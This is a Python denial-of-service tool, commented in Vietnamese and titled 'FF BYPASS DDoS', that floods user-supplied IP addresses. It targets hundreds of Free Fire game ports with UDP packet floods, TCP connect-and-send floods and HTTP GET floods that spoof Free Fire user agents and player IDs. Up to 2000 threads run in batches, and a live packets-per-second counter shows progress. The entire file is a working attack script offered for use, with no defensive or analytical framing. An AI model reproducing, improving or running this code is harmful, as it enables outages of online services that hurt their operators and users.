# ============================================
# FF BYPASS DDoS - 1000 THREADS
# DÙNG THREAD POOL - QUẢN LÝ SOCKET THEO BATCH
# KHÔNG MỞ QUÁ NHIỀU SOCKET CÙNG LÚC
# ============================================

import socket
import time
import threading
import os
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# PORT GAME FREE FIRE - FULL
# ============================================
FF_PORTS = []
for start, end in [
    (10000, 10100), (17000, 17100), (17500, 17600),
    (18000, 18100), (19000, 19100), (19500, 19600),
    (20000, 20100), (21000, 21100), (21500, 21600),
    (22000, 22100), (23000, 23100), (25000, 25100),
    (27000, 27100), (28000, 28100), (30000, 30100),
    (35000, 35100),
]:
    FF_PORTS.extend(range(start, end))

# ============================================
# ENGINE 1000 THREADS
# ============================================
class ThousandThreadEngine:
    def __init__(self):
        self.targets = []
        self.running = False
        self.packets = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.executor = None
    
    def inc(self, n=1):
        with self.lock: self.packets += n
    def err(self):
        with self.lock: self.errors += 1
    def get(self):
        with self.lock: return self.packets, self.errors

    def _fire_udp(self, batch_id):
        """Mỗi batch dùng 1 socket riêng - tránh xung đột"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(0.2)
        except:
            return
        
        data = os.urandom(2048)
        count = 0
        start = time.time()
        
        # Mỗi batch chạy 5 giây rồi nghỉ - tránh quá tải
        while self.running and count < 5000:
            try:
                ip = random.choice(self.targets)
                port = random.choice(FF_PORTS)
                
                for _ in range(20):
                    s.sendto(data, (ip, port))
                    self.inc()
                    count += 1
                    
            except:
                self.err()
        
        s.close()

    def _fire_tcp(self, batch_id):
        """TCP SYN - mỗi lần 1 socket mới"""
        count = 0
        while self.running and count < 3000:
            s = None
            try:
                ip = random.choice(self.targets)
                port = random.choice(FF_PORTS)
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.15)
                s.connect_ex((ip, port))
                s.send(os.urandom(256))
                self.inc()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _fire_http(self, batch_id):
        """HTTP Flood"""
        ua_list = [
            "FreeFire/1.107.1", "FreeFire/1.107.0",
            "okhttp/4.12.0", "UnityPlayer/2021.3.29f1",
        ]
        paths = ["/api/v1/match/join", "/api/v1/player/sync",
                 "/api/v1/battle/update", "/auth/login"]
        
        count = 0
        while self.running and count < 2000:
            s = None
            try:
                ip = random.choice(self.targets)
                port = random.choice([80, 443, 8080])
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.3)
                s.connect_ex((ip, port))
                
                req = (
                    f"GET {random.choice(paths)} HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(ua_list)}\r\n"
                    f"X-Player-Id: {random.randint(10000000,99999999)}\r\n"
                    f"Connection: close\r\n\r\n"
                )
                s.send(req.encode())
                self.inc()
                count += 1
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _batch_manager(self, total_threads, worker_func):
        """Quản lý batch - tạo thread theo đợt 200 cái một"""
        batch_size = 200
        created = 0
        
        while self.running and created < total_threads:
            batch = min(batch_size, total_threads - created)
            
            for i in range(batch):
                t = threading.Thread(
                    target=worker_func,
                    args=(created + i,),
                    daemon=True
                )
                t.start()
                created += 1
            
            # Nghỉ 0.5s giữa các batch để hệ thống thở
            if created < total_threads:
                time.sleep(0.5)

    def start(self, targets, threads, udp, tcp, http):
        if self.running:
            self.stop()
            time.sleep(0.3)
        
        if not targets:
            return 0
        
        self.targets = targets
        self.running = True
        self.packets = 0
        self.errors = 0
        
        total_started = 0
        
        # Phân bổ: 50% UDP, 30% TCP, 20% HTTP
        if udp:
            n = int(threads * 0.5)
            t = threading.Thread(target=self._batch_manager, args=(n, self._fire_udp), daemon=True)
            t.start()
            total_started += n
        
        if tcp:
            n = int(threads * 0.3)
            t = threading.Thread(target=self._batch_manager, args=(n, self._fire_tcp), daemon=True)
            t.start()
            total_started += n
        
        if http:
            n = int(threads * 0.2)
            t = threading.Thread(target=self._batch_manager, args=(n, self._fire_http), daemon=True)
            t.start()
            total_started += n
        
        return total_started

    def stop(self):
        self.running = False


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════╗
    ║  ☠ FF DDoS 1000 THREADS ☠            ║
    ║  {len(FF_PORTS)} PORTS | UDP+TCP+HTTP          ║
    ║  BATCH MODE - KHÔNG CRASH               ║
    ╚══════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    print("  [+] NHẬP IP MỤC TIÊU:")
    ip_input = input("\n  >> ").strip()
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!")
        input()
        return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    if not targets:
        print("  [-] KHÔNG CÓ MỤC TIÊU!")
        input()
        return
    
    print(f"\n  [+] SỐ THREADS (mặc định 1000):")
    try:
        threads = int(input("  >> ").strip() or "1000")
        if threads > 2000:
            threads = 2000
            print(f"  [!] Giới hạn 2000 threads")
    except:
        threads = 1000
    
    print(f"\n  [+] CHẾ ĐỘ:")
    print(f"      1. UDP+TCP+HTTP (1000 THREADS)")
    print(f"      2. UDP ONLY (1000 THREADS)")
    print(f"      3. TCP ONLY (1000 THREADS)")
    mode = input("  >> ").strip() or "1"
    
    udp = mode in ['1', '2']
    tcp = mode in ['1', '3']
    http = mode in ['1']
    
    print(f"\n  [☠] ĐANG TẠO {threads} THREADS...")
    print(f"  [!] Sẽ tạo theo batch 200 để tránh crash...")
    
    engine = ThousandThreadEngine()
    total = engine.start(targets, threads, udp, tcp, http)
    
    if not total:
        print("  [-] LỖI!")
        input()
        return
    
    start_time = time.time()
    print(f"  [✅] ĐÃ LÊN LỊCH {total} THREADS!")
    print(f"  [🎯] {len(targets)} IP | UDP:{udp} TCP:{tcp} HTTP:{http}")
    print(f"\n  ╔══════════════════════════════════╗")
    print(f"  ║  ĐANG TẤN CÔNG 1000 THREADS... ║")
    print(f"  ║  ENTER = DỪNG                  ║")
    print(f"  ╚══════════════════════════════════╝")
    
    monitor_run = True
    def monitor():
        while monitor_run and engine.running:
            packets, errors = engine.get()
            elapsed = time.time() - start_time
            pps = packets / elapsed if elapsed > 0 else 0
            m, s = divmod(int(elapsed), 60)
            print(f"\r  [📊] GÓI: {packets:,} | {pps:,.0f}/s | LỖI: {errors} | {m:02d}:{s:02d}  ", end='')
            time.sleep(0.3)
    
    threading.Thread(target=monitor, daemon=True).start()
    input()
    
    engine.stop()
    monitor_run = False
    time.sleep(0.5)
    
    packets, errors = engine.get()
    elapsed = time.time() - start_time
    pps = packets / elapsed if elapsed > 0 else 0
    m, s = divmod(int(elapsed), 60)
    
    print(f"""\n
    ╔══════════════════════════════════════════╗
    ║           KẾT THÚC                       ║
    ╠══════════════════════════════════════════╣
    ║  TIME:  {m:>2}p {s:>2}s                      ║
    ║  GÓI:   {packets:>10,}                        ║
    ║  TỐC ĐỘ:{pps:>10,.0f}/s                    ║
    ║  LỖI:   {errors:>10,}                        ║
    ║  THREAD:{total:>10}                        ║
    ╚══════════════════════════════════════════╝
    """)
    input()

if __name__ == '__main__':
    main()
